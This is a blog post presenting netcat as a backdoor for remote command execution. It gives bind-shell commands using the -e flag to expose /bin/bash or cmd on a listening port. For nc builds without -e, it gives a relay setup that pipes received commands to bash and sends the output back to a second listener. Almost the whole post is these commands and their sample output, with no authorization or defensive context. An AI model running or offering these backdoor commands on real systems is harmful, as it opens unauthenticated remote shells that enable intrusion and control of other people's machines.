---
layout: post
title:  "Use nc cli command as backdoor"
author: dave
date:   2023-12-20 15:30:59 +0200
categories: [Reversing, nix Security]
tags: [Reversing, nix Security, Networking]
published: true 
---

## Synopsis
Netcat (or nc) is a command-line utility that reads and writes data across network connections, using the TCP or UDP protocols. It is one of the most powerful tools in the network and system administrators arsenal, and it as considered as a Swiss army knife of networking tools.

Netcat is cross-platform, and it is available for Linux, macOS, Windows, and BSD. You can use Netcat to debug and monitor network connections, scan for open ports, transfer data, as a proxy, and more.


### Use 'nc' as backdoor for remote command execution
#### The easy / original way 
Earlier the **nc** command supported the **'-e'** flag which allowed the client to execute commands on the server and receive the output back on the client. This command flag may not be available anymore today on modern systems (specially macOS). But for completeness here is an example of how to use it.

**Server**

```bash
nc -l 9999 -e /bin/bash
```

On Windows (Windows needs the **-p** flag for specifying the port)

```bash
nc -l -p 6969 -e cmd
```
![_Setup Server on Windows_](../../assets/img/nc-backdoor/2023-12-20-NC-Setup-Server-Windows-NC-E-sized.png)

**Client**

```bash
nc 127.0.0.1 9999 ls
```

On macOS

```bash
nc 192.168.64.2 6969
```

![_Setup Client on macOS_](../../assets/img/nc-backdoor/2023-12-20-NC-Setup-Client-macOS-E-sized.png)

Output on client will be something like:

```bash
Applications
Desktop
Documents
Downloads
Movies
Music
Pictures
...
```

#### The 'old fashioned' way
With some (newer) versions of **nc** or on macOS for example you don't have the option of using the **-e** flag for executing commands on the target. But don't despair just yet, there is another way. You can use **nc** in another way to execute commands on the target and even get response of the executed commands. It's just a little more fingerworks to do.

The basic setup involves a **server** where you accept commands just the way you would do with the **-e** command, but as long as you cannot use this flag, you will have to forward the output to the interpreter by your self. This can be done with:

```bash
nc -l 6969 | /bin/bash
```
This command on the server side will forward all incomming messages to _/bin/bash_ and execute it, so far so well! But what is with the response? If you setup the connection between server and client like this, the client will get no response what so ever from the server and that might a be little bit poor. So what can we do?

What we can do, is to use the server as some kind of relay to execute the incomming command and then forward the result to another nc connection back to the client. So how will the setup Look like? First you setup a terminal on the client with the following command listening for results:

```bash
nc -l 6968
```

Then you setup the server with the relay listening for incomming commands, executeing them and forwardening the result back to the client with:

```bash
nc -l 6969 | /bin/bash | nc 127.0.0.1 6968
```

All that is left to do now is to setup a client connection to the server from where you can send commands with the following:

```bash
nc 127.0.0.1 6969
```

Now you can send commands from the client to the server and receive the results of the executed commands in the second terminal on the client.

### Overview

##### Console on CLIENT for output
```bash
nc -l 6968
```

##### Console on SERVER
```bash
nc -l 6969 | /bin/bash | nc 127.0.0.1 6968
```

##### Console on CLIENT for sending commands
```bash
nc 127.0.0.1 6969
```

## Credits
- [_linuxhandbook.com_](https://linuxhandbook.com/nc-command/){:target="_blank" rel="noopener"}
- [_linuxize.com_](https://linuxize.com/post/netcat-nc-command-with-examples/){:target="_blank" rel="noopener"}
- [_unix.stackexchange.com_](https://unix.stackexchange.com/questions/352490/is-nc-netcat-on-macos-missing-the-e-flag){:target="_blank" rel="noopener"}
